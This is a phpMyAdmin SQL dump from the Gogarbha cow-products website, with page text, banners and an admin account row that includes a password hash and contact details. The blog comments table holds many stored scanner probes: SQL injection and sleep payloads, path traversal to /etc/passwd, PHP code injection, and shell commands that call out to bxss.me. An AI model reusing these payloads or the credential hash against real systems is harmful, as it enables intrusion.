-- phpMyAdmin SQL Dump
-- version 5.1.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Mar 28, 2023 at 06:51 AM
-- Server version: 5.7.37
-- PHP Version: 7.4.32

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `gogargha`
--

-- --------------------------------------------------------

--
-- Table structure for table `aboutus`
--

CREATE TABLE `aboutus` (
  `id` int(255) NOT NULL,
  `text` text NOT NULL,
  `path` varchar(2000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `aboutus`
--

INSERT INTO `aboutus` (`id`, `text`, `path`) VALUES
(1, '<p><strong>Our Vision</strong></p>\r\n<ul style=\"list-style-type: disc;\">\r\n<li>To build a platform for Desi cow products.</li>\r\n<li>Connect and integrate goshalas.</li>\r\n<li>Provide organic supplements and build an ecosystem of Desi cow products.</li>\r\n</ul>\r\n<p><strong>Our Mission</strong></p>\r\n<ul>\r\n<li>Support rural employment, improve the standard of goshalas, and provide customers with natural, organic, and cow-related items.</li>\r\n<li>Reach out to markets for their products while assisting and integrating small farmers.</li>\r\n</ul>\r\n<p>&nbsp;</p>\r\n<p>A team of dedicated executives who want to work for the cause of enabling desi cow products and enabling the integration of goshalas, The team is highly motivated to support the cause of desi cow.</p>\r\n<p>The cow has been worshipped by us for several years. Our great sages drafted the pattern of our society in such a manner that we would preserve the precious gift given to us by nature &ldquo;Holy animal &ndash; Cow&rdquo;.&nbsp;</p>\r\n<p>We Gogarbha are committed to providing the best quality products to our customers without any compromise. Our products are 100 % safe &amp; natural. We offer you the best-handpicked products blended with natural herbs that are not just the finest but also fine-tuned to meet your needs in home care.</p>\r\n<p>&nbsp;</p>', 'assets/about/about16127884531.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `aboutus_kushal`
--

CREATE TABLE `aboutus_kushal` (
  `id` int(255) NOT NULL,
  `text` text NOT NULL,
  `path` varchar(2000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `aboutus_kushal`
--

INSERT INTO `aboutus_kushal` (`id`, `text`, `path`) VALUES
(1, '<p style=\"text-align:justify\">Kusal Indoor Gardens was established in the year 1993 at Bangalore, since then Kusal made its brand for artificial plants in the state as well as neighbouring states of TAMILNADU &amp; ANDHRA PRADESH. Being in the industry for 17 years, Highly Skilled and Innovative Experts Kusal indoor gardens has made a milestone in indoor and outdoor decoration for MNC&rsquo;s, Corporate sectors , Star-hotels, Banking institutions, Software cos. Restaurants and of course homes. Having good clientele, smarter projects, &amp; tremendous Creativity. Kusal has opened its branches in major metros like Chennai and Hyderabad with a team working on high profile projects. And as our client say if its about GREEN kusal is the only name, and word of mouth is leading our business. Our experienced professionals visualize and customize plants and floral arrangements for larger projects, besides Homes and Offices and as our slogan apparently says,</p>\n\n<p style=\"text-align:justify\">Kusal Indoor Gardens was established in the year 1993 at Bangalore, since then Kusal made its brand for artificial plants in the state as well as neighbouring states of TAMILNADU &amp; ANDHRA PRADESH. Being in the industry for 17 years, Highly Skilled and Innovative Experts Kusal indoor gardens has made a milestone in indoor and outdoor decoration for MNC&rsquo;s, Corporate sectors , Star-hotels, Banking institutions, Software cos. Restaurants and of course homes. Having good clientele, smarter projects, &amp; tremendous Creativity. Kusal has opened its branches in major metros like Chennai and Hyderabad with a team working on high profile projects. And as our client say if its about GREEN kusal is the only name, and word of mouth is leading our business. Our experienced professionals visualize and customize plants and floral arrangements for larger projects, besides Homes and Offices and as our slogan apparently says,</p>\n\n<h5 style=\"text-align:justify\">About Our Product</h5>\n\n<p style=\"text-align:justify\">Each item is a master piece by itself, Our Artificial greeneries are perfect alternate for natural greeneries, they are made of highly structured leaf veins, perfectly sculptured petals and unfurling buds to imitate live fresh flowers created from silks, which will give the feeling of reality and durability. Artificial plants and flowers are one of the best things to decorate your house and office. One of the best advantages of these artificial plants and flowers are they are suitable for all types of weather conditions. They can be also used for indoor as well as outdoor decoration purposes.</p>\n\n<p style=\"text-align:justify\">There are wide range of creepers, bushes, bonsais and beautiful flowers of various hues and colors- roses, mums, orchids, dahlias, carnations, button roses, tulips, lilies, gerberas, anthurium, daisies, poppies etc, and an exciting display of artificial plants with natural and plastic stems, like palms, bamboos, ficus, carpensia, yukka, diffenbachia, pothos , eye-catching maples of different colors- all of which could make you puzzle with reality and definitely an exclusive range to choose from, for even the most demanding customer. We assure that you will find each piece an art to be a perfect and elegant imitation of nature.</p>\n\n<h5 style=\"text-align: justify;\">About Maintenance</h5>\n\n<p style=\"text-align:justify\">Synthetic plants and flowers are relatively maintenance-free when compared to natural plants, as there are no insects, no dust, termites or fungus and this adds to the constant beauty, hygiene and cleanliness all the year round. In short, we bring nature to you within your budget where even you need not wait it to grow.</p>\n\n<p style=\"text-align:justify\">KUSAL INDOOR GARDEN - A perfect and elegant imitation of nature.</p>\n', 'assets/about/about14449910831.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `email` text NOT NULL,
  `name` text NOT NULL,
  `lname` text NOT NULL,
  `username` text NOT NULL,
  `passwrd` text NOT NULL,
  `profile_img` text NOT NULL,
  `city_id` int(11) NOT NULL,
  `contact` text NOT NULL,
  `login_type` varchar(10) NOT NULL COMMENT 'SA->SuperAdmin,A->Agent',
  `created_date` datetime NOT NULL,
  `modified_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `status` int(11) NOT NULL COMMENT '0->active;1->inactive;2->pending;3->new',
  `last_login` datetime NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `email`, `name`, `lname`, `username`, `passwrd`, `profile_img`, `city_id`, `contact`, `login_type`, `created_date`, `modified_date`, `status`, `last_login`) VALUES
(1, 'info@gogarbha.com', 'Admin', '', 'gogarbha', '04e66af347c406a1c5446c4ad432d54bdcb3be2f', 'assets/profile_images/pavtar1438861469.jpg', 1, '08025588985', 'SA', '0000-00-00 00:00:00', '2017-12-29 12:29:31', 0, '2023-03-23 11:28:28');

-- --------------------------------------------------------

--
-- Table structure for table `advertise`
--

CREATE TABLE `advertise` (
  `id` int(255) NOT NULL,
  `leftimage` varchar(255) NOT NULL,
  `rightimage` varchar(255) NOT NULL,
  `leftlink` varchar(255) NOT NULL,
  `rightlink` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `advertise`
--

INSERT INTO `advertise` (`id`, `leftimage`, `rightimage`, `leftlink`, `rightlink`) VALUES
(1, 'assets/advertise/advertise14393612501.jpg', 'assets/advertise/advertise14393612502.jpg', 'http://artiiplant.com/artiiplants/atp_manage/homepage/advertise', 'http://artiiplant.com/artiiplants/atp_manage/homepage/advertise');

-- --------------------------------------------------------

--
-- Table structure for table `banner`
--

CREATE TABLE `banner` (
  `id` int(11) NOT NULL,
  `order_no` int(11) NOT NULL,
  `banner_image` text NOT NULL,
  `banner_link` text NOT NULL,
  `descp` text NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL,
  `user_id` int(11) NOT NULL,
  `status` int(11) NOT NULL,
  `video` varchar(20) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `banner`
--

INSERT INTO `banner` (`id`, `order_no`, `banner_image`, `banner_link`, `descp`, `created_date`, `modified_date`, `user_id`, `status`, `video`) VALUES
(38, 1, 'assets/banner_images/banner16663556571.jpg', 'https://www.gogarbha.com/', 'Gogarbha', '2021-05-04 18:09:00', '2022-10-21 12:34:17', 1, 0, ''),
(35, 2, 'assets/banner_images/banner16663557781.jpg', 'https://www.gogarbha.com/', 'Gogarbha', '2021-02-24 15:00:37', '2022-10-21 12:36:18', 1, 1, ''),
(34, 3, 'assets/banner_images/banner16663558121.jpg', 'https://www.gogarbha.com/', 'Gogarbha', '2021-02-24 14:52:26', '2022-10-21 12:36:52', 1, 1, ''),
(45, 1, 'assets/banner_images/banner16663555981.jpg', 'https://www.gogarbha.com/', 'Gogarbha', '2022-06-01 10:01:36', '2022-10-21 12:33:18', 1, 1, ''),
(46, 4, 'assets/banner_images/banner16591666551.jpg', 'http://13.235.149.175/', 'gogarbha', '2022-07-28 05:54:21', '2022-07-30 07:37:35', 1, 1, ''),
(47, 2, 'assets/banner_images/banner16591666481.jpg', 'http://13.235.149.175/', 'gogarbha', '2022-07-28 05:54:40', '2022-07-30 07:37:28', 1, 1, ''),
(53, 1, 'assets/banner_images/banner16663553221.jpg', 'https://www.gogarbha.com/', 'Gogarbha', '2022-09-10 04:46:08', '2022-10-21 12:28:42', 1, 1, '1'),
(50, 1, 'assets/banner_images/banner16591666381.jpg', 'http://13.235.149.175/', 'gogarbha', '2022-07-28 05:55:44', '2022-07-30 07:37:18', 1, 1, ''),
(52, 3, 'assets/banner_images/banner16594242751.jpg', 'http://13.235.149.175/', 'Organic Food', '2022-07-29 18:11:24', '2022-08-02 07:11:15', 1, 1, ''),
(54, 2, 'assets/banner_images/banner16663555291.jpg', 'https://youtu.be/FtCFDeqvkQQ', 'Gogarbha', '2022-10-13 05:04:27', '2022-10-21 12:56:21', 1, 0, '');

-- --------------------------------------------------------

--
-- Table structure for table `banner_kushal`
--

CREATE TABLE `banner_kushal` (
  `id` int(11) NOT NULL,
  `order_no` int(11) NOT NULL,
  `banner_image` text NOT NULL,
  `banner_link` text NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL,
  `user_id` int(11) NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `banner_kushal`
--

INSERT INTO `banner_kushal` (`id`, `order_no`, `banner_image`, `banner_link`, `created_date`, `modified_date`, `user_id`, `status`) VALUES
(6, 1, 'assets/banner_images/banner14423790801.jpg', 'http://ivarustech.com.com/ivarustech.coms/products/product_view?page=taro-plant', '2015-08-06 15:39:20', '2015-09-16 10:21:20', 1, 1),
(5, 2, 'assets/banner_images/banner14423791011.jpg', 'http://ivarustech.com.com/ivarustech.coms/products/product_view?page=taro-plant', '2015-08-06 15:38:57', '2015-09-16 10:21:41', 1, 1),
(7, 4, 'assets/banner_images/banner14423791611.jpg', 'http://ivarustech.com.com/ivarustech.coms', '2015-08-07 14:11:16', '2015-09-16 10:26:08', 1, 1),
(9, 2, 'assets/banner_images/banner14452512931.jpg', 'http://www.artiiplant.com', '2015-09-16 10:26:34', '2015-10-19 16:11:33', 1, 0),
(8, 3, 'assets/banner_images/banner14452513071.jpg', 'http://www.artiiplant.com', '2015-09-05 13:45:51', '2015-10-19 16:11:47', 1, 0),
(11, 3, 'assets/banner_images/banner1445258875.jpg', 'http://www.artiiplant.com/', '2015-10-19 18:17:55', '2015-10-19 18:36:14', 1, 0),
(10, 1, 'assets/banner_images/banner14452588161.jpg', 'http://www.artiiplant.com', '2015-10-15 19:22:29', '2015-10-19 18:16:56', 1, 0);

-- --------------------------------------------------------

--
-- Table structure for table `blogposts_comments`
--

CREATE TABLE `blogposts_comments` (
  `id` int(11) NOT NULL,
  `fid` int(11) NOT NULL,
  `name` text NOT NULL,
  `email` text NOT NULL,
  `comment` text NOT NULL,
  `user_id` int(11) NOT NULL,
  `created_date` datetime NOT NULL,
  `status` int(11) NOT NULL DEFAULT '3'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `blogposts_comments`
--

INSERT INTO `blogposts_comments` (`id`, `fid`, `name`, `email`, `comment`, `user_id`, `created_date`, `status`) VALUES
(2, 8, 'vinay Sagar', 'sagar@gmail.com', 'hello commenthello commenthello commenthello commenthello commenthello commenthello commenthello commenthello commenthello commenthello commenthello comment', 1, '0000-00-00 00:00:00', 0),
(1, 8, 'vinay', 'vinay@gmail.com', 'hello comment', 1, '0000-00-00 00:00:00', 0),
(3, 10, 'vinay', 'vinay@gmail.com', 'hello comment', 1, '0000-00-00 00:00:00', 0),
(5, 10, 'vinay', 'sagar', 'sd', 0, '2015-08-21 14:55:40', 0),
(6, 10, 'test', 'test', 'test', 0, '2015-08-21 15:02:23', 1),
(7, 9, 'vinay', 'sagar', 'bhat', 0, '2015-08-21 15:31:45', 2),
(8, 8, 'new', 'new', 'new', 0, '2015-08-21 15:38:31', 2),
(9, 8, 'sad', 'sad', 'af', 0, '2015-08-21 15:40:30', 2),
(10, 10, 'name', 'sadasd@gmail.com', 'asdsd', 0, '2015-08-21 17:35:27', 2),
(11, 10, 'vinay', 'sagar@gmail.com', 'sd', 0, '2015-08-21 18:01:13', 2),
(12, 11, 'Vinay', 'sagar@gmail.com', 'Hello Modi...', 0, '2015-08-21 18:16:14', 1),
(13, 11, 'Aruna', 'arunacs.p3@gmail.com', 'Coments', 0, '2015-08-21 18:34:08', 1),
(14, 11, 'Aruna', 'arunacs.p3@gmail.com', 'My comment', 0, '2015-08-21 18:35:56', 1),
(15, 12, 'harsha', 'sssss@gmail.com', 'test', 0, '2015-09-03 10:59:26', 2),
(16, 12, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 10:41:07', 3),
(17, 12, 'e', 'sample@email.tst', '1\'\"', 0, '2020-09-14 10:53:04', 3),
(18, 12, 'e', 'sample@email.tst', '\\', 0, '2020-09-14 10:53:07', 3),
(19, 12, 'e', 'sample@email.tst', '1%2527%2522', 0, '2020-09-14 10:53:09', 3),
(20, 12, 'e', 'sample@email.tst', '@@QhHqC', 0, '2020-09-14 10:53:13', 3),
(21, 12, 'e', 'sample@email.tst', 'JyI=', 0, '2020-09-14 10:53:16', 3),
(22, 12, 'e', 'sample@email.tst', '\'\"', 0, '2020-09-14 10:53:18', 3),
(23, 12, 'e', 'sample@email.tst', '\'\'\"\"', 0, '2020-09-14 10:53:22', 3),
(24, 1, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 10:53:25', 3),
(25, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 10:53:27', 3),
(26, 1, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 10:53:31', 3),
(27, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 10:53:34', 3),
(28, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 10:53:37', 3),
(29, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 10:53:40', 3),
(30, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 10:53:42', 3),
(31, 12, 'e', '1\'\"', 'e', 0, '2020-09-14 10:53:45', 3),
(32, 12, 'e', '\\', 'e', 0, '2020-09-14 10:53:47', 3),
(33, 12, 'e', '1%2527%2522', 'e', 0, '2020-09-14 10:53:50', 3),
(34, 12, 'e', '@@4Ek8v', 'e', 0, '2020-09-14 10:53:53', 3),
(35, 12, 'e', 'JyI=', 'e', 0, '2020-09-14 10:53:56', 3),
(36, 12, 'e', '\'\"', 'e', 0, '2020-09-14 10:53:59', 3),
(37, 12, 'e', '\'\'\"\"', 'e', 0, '2020-09-14 10:54:01', 3),
(38, 12, '1\'\"', 'sample@email.tst', 'e', 0, '2020-09-14 10:54:04', 3),
(39, 12, '\\', 'sample@email.tst', 'e', 0, '2020-09-14 10:54:08', 3),
(40, 12, '1%2527%2522', 'sample@email.tst', 'e', 0, '2020-09-14 10:54:10', 3),
(41, 12, '@@1wLmu', 'sample@email.tst', 'e', 0, '2020-09-14 10:54:13', 3),
(42, 12, 'JyI=', 'sample@email.tst', 'e', 0, '2020-09-14 10:54:15', 3),
(43, 12, '\'\"', 'sample@email.tst', 'e', 0, '2020-09-14 10:54:18', 3),
(44, 12, '\'\'\"\"', 'sample@email.tst', 'e', 0, '2020-09-14 10:54:20', 3),
(45, 12, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:07:37', 3),
(46, 12, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:07:39', 3),
(47, 12, 'e', 'sample@email.tst', 'ScAiwyKY', 0, '2020-09-14 11:07:42', 3),
(48, 12, 'e', 'sample@email.tst', '-1 OR 2+423-423-1=0+0+0+1 -- ', 0, '2020-09-14 11:07:45', 3),
(49, 12, 'e', 'sample@email.tst', '-1 OR 2+987-987-1=0+0+0+1', 0, '2020-09-14 11:07:47', 3),
(50, 12, 'e', 'sample@email.tst', '-1\' OR 2+490-490-1=0+0+0+1 -- ', 0, '2020-09-14 11:07:51', 3),
(51, 12, 'e', 'sample@email.tst', '-1\' OR 2+170-170-1=0+0+0+1 or \'hH7pFecV\'=\'', 0, '2020-09-14 11:07:54', 3),
(52, 12, 'e', 'sample@email.tst', '-1\" OR 2+161-161-1=0+0+0+1 -- ', 0, '2020-09-14 11:07:56', 3),
(53, 12, 'e', 'sample@email.tst', '../../../../../../../../../../etc/passwd', 0, '2020-09-14 11:07:58', 3),
(54, 12, 'e', 'sample@email.tst', '814\'', 0, '2020-09-14 11:07:58', 3),
(55, 12, 'e', 'sample@email.tst', '../../../../../../../../../../windows/win.ini', 0, '2020-09-14 11:08:01', 3),
(56, 12, 'e', 'sample@email.tst', 'if(now()=sysdate(),sleep(14),0)', 0, '2020-09-14 11:08:01', 3),
(57, 12, 'e', 'sample@email.tst', '0\'XOR(if(now()=sysdate(),sleep(14),0))XOR\'Z', 0, '2020-09-14 11:08:04', 3),
(58, 12, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:04', 3),
(59, 12, 'e', 'sample@email.tst', '${9999518+9999589}', 0, '2020-09-14 11:08:06', 3),
(60, 12, 'e', 'sample@email.tst', '0\"XOR(if(now()=sysdate(),sleep(14),0))XOR\"Z', 0, '2020-09-14 11:08:06', 3),
(61, 12, 'e', 'sample@email.tst', 'HttP://bxss.me/t/xss.html?', 0, '2020-09-14 11:08:06', 3),
(62, 12, 'e', 'sample@email.tst', '../e', 0, '2020-09-14 11:08:06', 3),
(63, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:08', 3),
(64, 12, 'e', 'sample@email.tst', 'bxss.me/t/xss.html?', 0, '2020-09-14 11:08:08', 3),
(65, 12, 'e', 'sample@email.tst', '(select(0)from(select(sleep(14)))v)/*\'+(select(0)from(select(sleep(14)))v)+\'\"+(select(0)from(select(sleep(14)))v)+\"*/', 0, '2020-09-14 11:08:09', 3),
(66, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:09', 3),
(67, 12, 'e', 'sample@email.tst', ';print(md5(31337));', 0, '2020-09-14 11:08:10', 3),
(68, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:10', 3),
(69, 12, 'e', 'sample@email.tst', '1 waitfor delay \'0:0:14\' -- ', 0, '2020-09-14 11:08:11', 3),
(70, 12, 'e', '${9999095+9999830}', 'e', 0, '2020-09-14 11:08:11', 3),
(71, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:12', 3),
(72, 12, 'e', 'sample@email.tst', ')', 0, '2020-09-14 11:08:12', 3),
(73, 12, 'e', 'sample@email.tst', '\';print(md5(31337));$a=\'', 0, '2020-09-14 11:08:12', 3),
(74, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:13', 3),
(75, 12, '${9999720+9999385}', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:14', 3),
(76, 12, 'e', 'sample@email.tst', 'g0yYoeAt\'; waitfor delay \'0:0:14\' -- ', 0, '2020-09-14 11:08:15', 3),
(77, 12, 'e', 'sample@email.tst', '!(()&&!|*|*|', 0, '2020-09-14 11:08:15', 3),
(78, 12, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:15', 3),
(79, 12, 'e', 'sample@email.tst', '\";print(md5(31337));$a=\"', 0, '2020-09-14 11:08:15', 3),
(80, 12, 'e', 'HttP://bxss.me/t/xss.html?', 'e', 0, '2020-09-14 11:08:15', 3),
(81, 12, 'e', 'sample@email.tst', '^(#$!@#$)(()))******', 0, '2020-09-14 11:08:17', 3),
(82, 12, 'e', 'sample@email.tst', 'echo zalztq$()\\ wvpino\\nz^xyu||a #\' &echo zalztq$()\\ wvpino\\nz^xyu||a #|\" &echo zalztq$()\\ wvpino\\nz^xyu||a #', 0, '2020-09-14 11:08:18', 3),
(83, 12, 'e', 'sample@email.tst', 'LKCEpTdx\' OR 816=(SELECT 816 FROM PG_SLEEP(14))--', 0, '2020-09-14 11:08:18', 3),
(84, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:18', 3),
(85, 12, 'e', 'sample@email.tst', 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', 0, '2020-09-14 11:08:18', 3),
(86, 12, 'e', 'bxss.me/t/xss.html?', 'e', 0, '2020-09-14 11:08:18', 3),
(87, 12, 'e', 'sample@email.tst', '${@print(md5(31337))}', 0, '2020-09-14 11:08:18', 3),
(88, 12, 'e', 'sample@email.tst', 'SFa3f7vX\') OR 545=(SELECT 545 FROM PG_SLEEP(14))--', 0, '2020-09-14 11:08:20', 3),
(89, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:20', 3),
(90, 12, 'e', 'sample@email.tst', '&echo ynbzwc$()\\ ohcjoz\\nz^xyu||a #\' &echo ynbzwc$()\\ ohcjoz\\nz^xyu||a #|\" &echo ynbzwc$()\\ ohcjoz\\nz^xyu||a #', 0, '2020-09-14 11:08:20', 3),
(91, 12, 'e', 'sample@email.tst', '1some_inexistent_file_with_long_name.jpg', 0, '2020-09-14 11:08:21', 3),
(92, 12, 'HttP://bxss.me/t/xss.html?', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:21', 3),
(93, 12, 'e', 'sample@email.tst', '${@print(md5(31337))}\\', 0, '2020-09-14 11:08:21', 3),
(94, 12, 'e', '../../../../../../../../../../etc/passwd', 'e', 0, '2020-09-14 11:08:21', 3),
(95, 12, 'e', 'sample@email.tst', 'AJO37WyY\')) OR 633=(SELECT 633 FROM PG_SLEEP(14))--', 0, '2020-09-14 11:08:22', 3),
(96, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:23', 3),
(97, 12, 'e', 'sample@email.tst', '|echo nxtxni$()\\ mzzovl\\nz^xyu||a #\' |echo nxtxni$()\\ mzzovl\\nz^xyu||a #|\" |echo nxtxni$()\\ mzzovl\\nz^xyu||a #', 0, '2020-09-14 11:08:23', 3),
(98, 12, 'e', 'sample@email.tst', '\'.print(md5(31337)).\'', 0, '2020-09-14 11:08:24', 3),
(99, 12, 'e', 'sample@email.tst', 'Http://bxss.me/t/fit.txt', 0, '2020-09-14 11:08:24', 3),
(100, 12, 'bxss.me/t/xss.html?', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:24', 3),
(101, 12, 'e', '../../../../../../../../../../windows/win.ini', 'e', 0, '2020-09-14 11:08:24', 3),
(102, 12, 'e', 'sample@email.tst', 'e\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),14)||\'', 0, '2020-09-14 11:08:25', 3),
(103, 12, 'e', 'sample@email.tst', '(nslookup hitcujzgrkyio293c8.bxss.me||perl -e \"gethostbyname(\'hitcujzgrkyio293c8.bxss.me\')\")', 0, '2020-09-14 11:08:26', 3),
(104, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:27', 3),
(105, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:27', 3),
(106, 12, 'e', 'sample@email.tst', 'http://bxss.me/t/fit.txt?.jpg', 0, '2020-09-14 11:08:27', 3),
(107, 12, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:27', 3),
(108, 12, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:27', 3),
(109, 12, 'e', 'sample@email.tst', '$(nslookup hittpmjovwuai85cc5.bxss.me||perl -e \"gethostbyname(\'hittpmjovwuai85cc5.bxss.me\')\")', 0, '2020-09-14 11:08:29', 3),
(110, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:29', 3),
(111, 12, 'e', '../sample@email.tst', 'e', 0, '2020-09-14 11:08:29', 3),
(112, 12, 'e', ')', 'e', 0, '2020-09-14 11:08:29', 3),
(113, 12, 'e', 'sample@email.tst', 'bxss.me', 0, '2020-09-14 11:08:29', 3),
(114, 12, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:30', 3),
(115, 12, 'e', 'sample@email.tst', '&(nslookup hitrdtxodzlry35839.bxss.me||perl -e \"gethostbyname(\'hitrdtxodzlry35839.bxss.me\')\")&\'\\\"`0&(nslookup hitrdtxodzlry35839.bxss.me||perl -e \"gethostbyname(\'hitrdtxodzlry35839.bxss.me\')\")&`\'', 0, '2020-09-14 11:08:31', 3),
(116, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:31', 3),
(117, 12, 'e', '!(()&&!|*|*|', 'e', 0, '2020-09-14 11:08:32', 3),
(118, 12, '../../../../../../../../../../etc/passwd', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:32', 3),
(119, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:32', 3),
(120, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:32', 3),
(121, 12, 'e', 'sample@email.tst', '|(nslookup hitajfrmqhgwsfeefd.bxss.me||perl -e \"gethostbyname(\'hitajfrmqhgwsfeefd.bxss.me\')\")', 0, '2020-09-14 11:08:34', 3),
(122, 12, 'e', '^(#$!@#$)(()))******', 'e', 0, '2020-09-14 11:08:34', 3),
(123, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:34', 3),
(124, -1, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:34', 3),
(125, 1, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:34', 3),
(126, 12, '../../../../../../../../../../windows/win.ini', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:34', 3),
(127, 12, 'e', 'sample@email.tst', '`(nslookup hitzdnijstmih97505.bxss.me||perl -e \"gethostbyname(\'hitzdnijstmih97505.bxss.me\')\")`', 0, '2020-09-14 11:08:37', 3),
(128, 12, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:37', 3),
(129, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:37', 3),
(130, 12, ')', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:37', 3),
(131, -1, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:37', 3),
(132, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:37', 3),
(133, 12, 'e', 'sample@email.tst', ';(nslookup hitajpcfirxioa3a7e.bxss.me||perl -e \"gethostbyname(\'hitajpcfirxioa3a7e.bxss.me\')\")|(nslookup hitajpcfirxioa3a7e.bxss.me||perl -e \"gethostbyname(\'hitajpcfirxioa3a7e.bxss.me\')\")&(nslookup hitajpcfirxioa3a7e.bxss.me||perl -e \"gethostbyname(\'hitajpcfirxioa3a7e.bxss.me\')\")', 0, '2020-09-14 11:08:38', 3),
(134, 12, '../e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:39', 3),
(135, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:39', 3),
(136, 12, '!(()&&!|*|*|', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:40', 3),
(137, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:40', 3),
(138, -1, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:40', 3),
(139, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:40', 3),
(140, 12, 'e', ';print(md5(31337));', 'e', 0, '2020-09-14 11:08:41', 3),
(141, -1, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:42', 3),
(142, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:42', 3),
(143, 12, '^(#$!@#$)(()))******', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:42', 3),
(144, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:42', 3),
(145, 12, 'e', '\';print(md5(31337));$a=\'', 'e', 0, '2020-09-14 11:08:44', 3),
(146, -1, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:44', 3),
(147, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:44', 3),
(148, 12, 'e', 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.tst', 'e', 0, '2020-09-14 11:08:44', 3),
(149, 12, 'e', '\";print(md5(31337));$a=\"', 'e', 0, '2020-09-14 11:08:46', 3),
(150, 30, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:47', 3),
(151, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:47', 3),
(152, 12, 'e', '1some_inexistent_file_with_long_name.tst', 'e', 0, '2020-09-14 11:08:47', 3),
(153, 12, 'e', '${@print(md5(31337))}', 'e', 0, '2020-09-14 11:08:49', 3),
(154, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:49', 3),
(155, 12, 'e', 'Http://bxss.me/t/fit.txt', 'e', 0, '2020-09-14 11:08:50', 3),
(156, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:50', 3),
(157, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:52', 3),
(158, 12, 'e', '${@print(md5(31337))}\\', 'e', 0, '2020-09-14 11:08:52', 3),
